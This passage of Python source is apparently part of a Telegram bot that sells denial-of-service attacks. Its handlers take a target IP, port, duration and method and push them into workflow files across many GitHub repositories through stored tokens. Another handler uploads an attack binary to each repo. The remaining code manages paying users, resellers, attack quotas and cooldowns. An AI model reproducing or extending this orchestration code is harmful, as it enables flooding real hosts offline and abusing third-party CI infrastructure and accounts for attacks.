        global MAX_ATTACKS
        MAX_ATTACKS = max_attacks
        save_max_attacks(max_attacks)

        await query.message.edit_text(
            f"✅ **MAXIMUM ATTACKS UPDATED**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"New limit: `{MAX_ATTACKS}` attack(s) per user"
        )
        return

    # Attack time setting
    if data.startswith("attack_time_"):
        attack_duration = int(data.split("_")[2])

        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**\nPlease start again.")
            return

        ip = temp_data[user_id]["ip"]
        port = temp_data[user_id]["port"]
        method = temp_data[user_id]["method"]

        del temp_data[user_id]

        await query.message.edit_text("🔄 **STARTING ATTACK...**")

        start_attack(ip, port, attack_duration, user_id, method)

        success_count = 0
        fail_count = 0
        threads = []
        results = []

        def update_single_token(token_data):
            try:
                result = update_yml_file(
                    token_data['token'],
                    token_data['repo'],
                    ip, port, attack_duration, method
                )
                results.append((token_data['username'], result))
            except Exception as e:
                results.append((token_data['username'], False))

        for token_data in github_tokens:
            thread = threading.Thread(target=update_single_token, args=(token_data,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        for username, success in results:
            if success:
                success_count += 1
            else:
                fail_count += 1

        user_id_str = str(user_id)
        remaining_attacks = MAX_ATTACKS - user_attack_counts.get(user_id_str, 0)

        reply_markup = get_main_keyboard(user_id)
        message = (
            f"🎯 **ATTACK STARTED!**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"🌐 Target: `{ip}`\n"
            f"🚪 Port: `{port}`\n"
            f"⏱️ Time: `{attack_duration}s`\n"
            f"🖥️ Servers: `{success_count}`\n"
            f"⚡ Method: {method}\n"
            f"⏳ Cooldown: {COOLDOWN_DURATION}s after attack\n"
            f"🎯 Remaining attacks: {remaining_attacks}/{MAX_ATTACKS}"
        )

        await query.message.edit_text(message)
        await query.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)

        def monitor_attack_completion():
            time.sleep(attack_duration)
            finish_attack()
            logger.info(f"Attack completed automatically after {attack_duration} seconds")

        monitor_thread = threading.Thread(target=monitor_attack_completion)
        monitor_thread.daemon = True
        monitor_thread.start()

        return

    # Add user days selection
    if data.startswith("days_"):
        days = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**\nPlease start again.")
            return

        new_user_id = temp_data[user_id]["new_user_id"]
        del temp_data[user_id]

        pending_users[:] = [u for u in pending_users if str(u['user_id']) != str(new_user_id)]
        save_pending_users(pending_users)

        if days == 0:
            expiry = "LIFETIME"
        else:
            expiry = time.time() + (days * 24 * 60 * 60)

        approved_users[str(new_user_id)] = {
            "username": f"user_{new_user_id}",
            "added_by": user_id,
            "added_date": time.strftime("%Y-%m-%d %H:%M:%S"),
            "expiry": expiry,
            "days": days
        }
        save_approved_users(approved_users)

        try:
            await context.bot.send_message(
                chat_id=new_user_id,
                text=f"✅ **ACCESS APPROVED!**\n━━━━━━━━━━━━━━━━━━━━━━\nYour access has been approved for {days if days > 0 else 'lifetime'} {'days' if days > 1 else ('day' if days == 1 else '')}."
            )
        except:
            pass

        reply_markup = get_main_keyboard(user_id)
        await query.message.edit_text(
            f"✅ **USER ADDED**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"User ID: `{new_user_id}`\n"
            f"Duration: {days if days > 0 else 'Lifetime'} {'days' if days > 1 else ('day' if days == 1 else '')}\n"
            f"Added by: `{user_id}`"
        )
        await query.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)
        return

    # Reseller credits selection
    if data.startswith("credits_"):
        credits = int(data.split("_")[1])

        if user_id not in temp_data:
            await query.message.edit_text("❌ **SESSION EXPIRED**\nPlease start again.")
            return

        temp_data[user_id]["credits"] = credits
        temp_data[user_id]["step"] = "reseller_add_username"

        reply_markup = get_cancel_keyboard()
        await query.message.edit_text(
            "💰 **ADD RESELLER - STEP 3/3**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"✅ User ID: `{temp_data[user_id]['reseller_id']}`\n"
            f"✅ Credits: `{credits}`\n\n"
            "Send the username:\n\nExample: `john`"
        )
        await query.message.reply_text("Type username:", reply_markup=reply_markup)
        return


# ==================== BROADCAST HANDLER ====================

async def send_broadcast(update: Update, context: ContextTypes.DEFAULT_TYPE, message: str, user_id):
    all_users = set()

    for uid in approved_users.keys():
        all_users.add(int(uid))

    for uid in resellers.keys():
        all_users.add(int(uid))

    for uid in admins.keys():
        all_users.add(int(uid))

    for uid in owners.keys():
        all_users.add(int(uid))

    total_users = len(all_users)
    success_count = 0
    fail_count = 0

    progress_msg = await update.message.reply_text(
        f"📢 **SENDING BROADCAST...**\n"
        f"Total users: {total_users}"
    )

    for uid in all_users:
        try:
            await context.bot.send_message(
                chat_id=uid,
                text=f"📢 **BROADCAST**\n━━━━━━━━━━━━━━━━━━━━━━\n{message}"
            )
            success_count += 1
            time.sleep(0.1)
        except:
            fail_count += 1

    reply_markup = get_main_keyboard(user_id)
    await progress_msg.edit_text(
        f"✅ **BROADCAST COMPLETED**\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n"
        f"• ✅ Successful: {success_count}\n"
        f"• ❌ Failed: {fail_count}\n"
        f"• 📊 Total: {total_users}\n"
        f"• 📝 Message: {message[:50]}..."
    )
    await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)


# ==================== BINARY FILE HANDLER ====================

async def handle_binary_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id

    if user_id not in temp_data or temp_data[user_id].get("step") != "binary_upload":
        return

    if not update.message.document:
        await update.message.reply_text("❌ **PLEASE SEND A FILE**\nNot text. Send your binary file.")
        return

    del temp_data[user_id]

    progress_msg = await update.message.reply_text("📥 **DOWNLOADING YOUR BINARY FILE...**")

    try:
        file = await update.message.document.get_file()
        file_path = f"temp_binary_{user_id}.bin"
        await file.download_to_drive(file_path)

        with open(file_path, 'rb') as f:
            binary_content = f.read()

        file_size = len(binary_content)

        # ✅ NEW: Save binary file for future tokens
        save_binary_file(binary_content)

        await progress_msg.edit_text(
            f"📊 **FILE DOWNLOADED: {file_size} bytes**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            "📤 Uploading to all GitHub repos..."
        )

        success_count = 0
        fail_count = 0
        results = []

        def upload_to_repo(token_data):
            try:
                success, status = upload_binary_to_repo(token_data, binary_content)
                results.append((token_data['username'], success, status))
            except Exception as e:
                results.append((token_data['username'], False, str(e)))

        threads = []
        for token_data in github_tokens:
            thread = threading.Thread(target=upload_to_repo, args=(token_data,))
            threads.append(thread)
            thread.start()

        for thread in threads:
            thread.join()

        for username, success, status in results:
            if success:
                success_count += 1
            else:
                fail_count += 1

        os.remove(file_path)

        reply_markup = get_main_keyboard(user_id)
        message = (
            f"✅ **BINARY UPLOAD COMPLETED!**\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📊 **Results:**\n"
            f"• ✅ Successful: {success_count}\n"
            f"• ❌ Failed: {fail_count}\n"
            f"• 📊 Total: {len(github_tokens)}\n"
            "━━━━━━━━━━━━━━━━━━━━━━\n"
            f"📁 **File:** `{BINARY_FILE_NAME}`\n"
            f"📦 **File size:** {file_size} bytes\n"
            f"⚙️ **Binary ready:** ✅\n\n"
            f"ℹ️ This binary will be auto-uploaded to new tokens"
        )

        await progress_msg.edit_text(message)
        await update.message.reply_text("Use buttons to continue:", reply_markup=reply_markup)

    except Exception as e:
        await progress_msg.edit_text(f"❌ **ERROR**\n━━━━━━━━━━━━━━━━━━━━━━\n{str(e)}")


def main():
    application = Application.builder().token(BOT_TOKEN).build()

    # Button callback handler for inline keyboards
    application.add_handler(CallbackQueryHandler(button_callback))

    # Start command
    application.add_handler(CommandHandler("start", start))

    # File handler for binary upload
    application.add_handler(MessageHandler(filters.Document.ALL, handle_binary_file))

    # Text message handler for all button presses and text input
    application.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_button_press))

    print("🤖 **THE BOT IS RUNNING...**")
    print("━━━━━━━━━━━━━━━━━━━━━━")
    print(f"👑 Primary owners: {[uid for uid, info in owners.items() if info.get('is_primary', False)]}")
    print(f"👑 Secondary owners: {[uid for uid, info in owners.items() if not info.get('is_primary', False)]}")
    print(f"📊 Approved users: {len(approved_users)}")
    print(f"💰 Resellers: {len(resellers)}")
    print(f"🔑 Servers: {len(github_tokens)}")
    print(f"🔧 Maintenance: {'ON' if MAINTENANCE_MODE else 'OFF'}")
    print(f"⏳ Cooldown: {COOLDOWN_DURATION}s")
    print(f"🎯 Max attacks: {MAX_ATTACKS}")
    print("━━━━━━━━━━━━━━━━━━━━━━")

    application.run_polling()

if __name__ == '__main__':
    main()
